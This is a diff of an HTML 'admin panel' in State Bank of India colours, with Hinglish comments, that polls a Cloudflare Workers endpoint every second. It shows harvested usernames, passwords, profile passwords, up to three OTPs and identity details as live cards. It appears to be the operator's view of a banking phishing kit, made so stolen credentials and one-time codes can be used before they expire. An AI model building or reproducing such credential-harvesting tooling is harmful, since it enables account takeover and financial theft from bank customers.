@@ -3,108 +3,74 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SBI - Live Admin Panel</title>
+    <title>SBI - Separate Cards Admin</title>
     <style>
-        * { box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, sans-serif; margin: 0; padding: 0; }
-        body { background-color: #f4f7f6; color: #333; padding-bottom: 30px; }
+        body { font-family: sans-serif; background: #f4f4f4; margin: 0; padding: 0; }
+        .header { background: #b30000; color: white; padding: 15px; text-align: center; position: sticky; top: 0; z-index: 100; box-shadow: 0 2px 5px rgba(0,0,0,0.2); }
+        .container { padding: 10px; max-width: 500px; margin: auto; }
         
-        .header { 
-            background: #b30000; color: white; padding: 15px; text-align: center; 
-            position: sticky; top: 0; z-index: 100; box-shadow: 0 2px 10px rgba(0,0,0,0.1); 
-        }
-        .live-dot { 
-            height: 10px; width: 10px; background: #fff; border-radius: 50%; 
-            display: inline-block; margin-right: 5px; animation: blink 1s infinite; 
-        }
-        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
-
-        .container { padding: 15px; max-width: 600px; margin: auto; }
-        
+        /* Chota aur Clean Card */
         .card { 
-            background: white; border-radius: 12px; padding: 15px; margin-bottom: 20px; 
-            border-top: 5px solid #b30000; box-shadow: 0 4px 12px rgba(0,0,0,0.08); 
+            background: white; border-radius: 8px; padding: 12px; margin-bottom: 12px; 
+            border-left: 5px solid #b30000; box-shadow: 0 2px 4px rgba(0,0,0,0.1); 
         }
-        .card-header { 
-            display: flex; justify-content: space-between; font-size: 10px; 
-            color: #999; margin-bottom: 12px; border-bottom: 1px solid #eee; padding-bottom: 5px;
-        }
-
-        .data-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
-        .data-item { margin-bottom: 8px; }
-        .label { font-size: 10px; color: #888; text-transform: uppercase; font-weight: bold; }
-        .value { font-size: 15px; font-weight: 600; word-break: break-all; margin-top: 2px; }
+        .time { font-size: 10px; color: #999; margin-bottom: 8px; display: block; }
+        .data-box { display: flex; flex-direction: column; gap: 5px; }
+        .label { font-size: 10px; color: #b30000; font-weight: bold; text-transform: uppercase; }
+        .value { font-size: 16px; font-weight: bold; color: #333; word-break: break-all; }
         
-        .u-blue { color: #0054a6; }
-        .p-red { color: #b30000; font-family: 'Courier New', Courier, monospace; }
-        .o-green { color: #1e7e34; }
-
-        #loading { text-align: center; margin-top: 50px; color: #b30000; font-weight: bold; }
+        /* Highlight for important data */
+        .user-val { color: #0054a6; }
+        .otp-val { color: #1e7e34; font-size: 20px; letter-spacing: 1px; }
     </style>
 </head>
 <body>
 
     <div class="header">
-        <div><span class="live-dot"></span> <b>LIVE MONITORING</b></div>
-        <div style="font-size: 11px; margin-top: 4px; opacity: 0.9;">Refreshing every 1 second</div>
+        <h3 style="margin:0;">● LIVE LOGS (Separate)</h3>
+        <small>Newest on Top | Refreshing 1s</small>
     </div>
 
-    <div class="container" id="data-container">
-        <div id="loading">Connecting to Worker...</div>
+    <div class="container" id="logs">
+        <div style="text-align:center; margin-top:50px;">Loading logs...</div>
     </div>
 
     <script>
-        // APNA WORKER URL YAHAN DALEIN
         const workerURL = 'https://dawn-hat-2875.sumankkuuyy.workers.dev/';
 
-        async function fetchData() {
+        async function getLogs() {
             try {
-                const response = await fetch(workerURL);
-                if (!response.ok) throw new Error("Network error");
+                const res = await fetch(workerURL);
+                const data = await res.json();
+                const container = document.getElementById('logs');
                 
-                // Hum expect kar rahe hain ki worker JSON list bhej raha hai
-                const dataList = await response.json(); 
-                renderCards(dataList);
-            } catch (error) {
-                console.error("Error fetching data:", error);
-                document.getElementById('loading').innerText = "Error: Check Worker URL or CORS";
-            }
+                if (data.length === 0) {
+                    container.innerHTML = '<p style="text-align:center; color:#999;">No logs yet.</p>';
+                    return;
+                }
+
+                let html = '';
+                // Sabse naya card sabse upar
+                data.reverse().forEach(item => {
+                    html += `<div class="card"><span class="time">🕒 ${item.time || 'Just now'}</span><div class="data-box">`;
+                    
+                    // Card ke andar wahi data dikhao jo available hai
+                    if(item.user) html += `<div class="label">Username</div><div class="value user-val">${item.user}</div>`;
+                    if(item.pass) html += `<div class="label">Password</div><div class="value">${item.pass}</div>`;
+                    if(item.profile_pass) html += `<div class="label">Profile Password</div><div class="value">${item.profile_pass}</div>`;
+                    if(item.otp1) html += `<div class="label">OTP - 1</div><div class="value otp-val">${item.otp1}</div>`;
+                    if(item.otp2) html += `<div class="label">OTP - 2</div><div class="value otp-val">${item.otp2}</div>`;
+                    if(item.otp3) html += `<div class="label">OTP - 3</div><div class="value otp-val">${item.otp3}</div>`;
+                    if(item.identity) html += `<div class="label">Identity</div><div class="value">${item.identity}</div>`;
+                    
+                    html += `</div></div>`;
+                });
+                container.innerHTML = html;
+            } catch (e) { console.log(e); }
         }
 
-        function renderCards(items) {
-            const container = document.getElementById('data-container');
-            if (items.length === 0) {
-                container.innerHTML = '<div id="loading">Waiting for data...</div>';
-                return;
-            }
-
-            // Sabse naya data upar dikhane ke liye reverse
-            let html = '';
-            items.reverse().forEach(item => {
-                html += `
-                <div class="card">
-                    <div class="card-header">
-                        <span>SESSION: ${item.user_id || 'N/A'}</span>
-                        <span style="color: #b30000; font-weight:bold;">LIVE</span>
-                    </div>
-                    <div class="data-grid">
-                        <div class="data-item"><div class="label">Username</div><div class="value u-blue">${item.user || '-'}</div></div>
-                        <div class="data-item"><div class="label">Password</div><div class="value p-red">${item.pass || '-'}</div></div>
-                        <div class="data-item"><div class="label">Profile Pass</div><div class="value p-red">${item.profile_pass || '-'}</div></div>
-                        <div class="data-item"><div class="label">OTP 1</div><div class="value o-green">${item.otp1 || '-'}</div></div>
-                        <div class="data-item"><div class="label">OTP 2</div><div class="value o-green">${item.otp2 || '-'}</div></div>
-                        <div class="data-item"><div class="label">OTP 3</div><div class="value o-green">${item.otp3 || '-'}</div></div>
-                        <div class="data-item"><div class="label">Identity/ID</div><div class="value">${item.identity || '-'}</div></div>
-                    </div>
-                </div>`;
-            });
-            container.innerHTML = html;
-        }
-
-        // Har 1 second mein data fetch karo
-        setInterval(fetchData, 1000);
-        // Pehli baar turant load karo
-        fetchData();
+        setInterval(getLogs, 1000);
+        getLogs();
     </script>
 </body>
 </html>
-
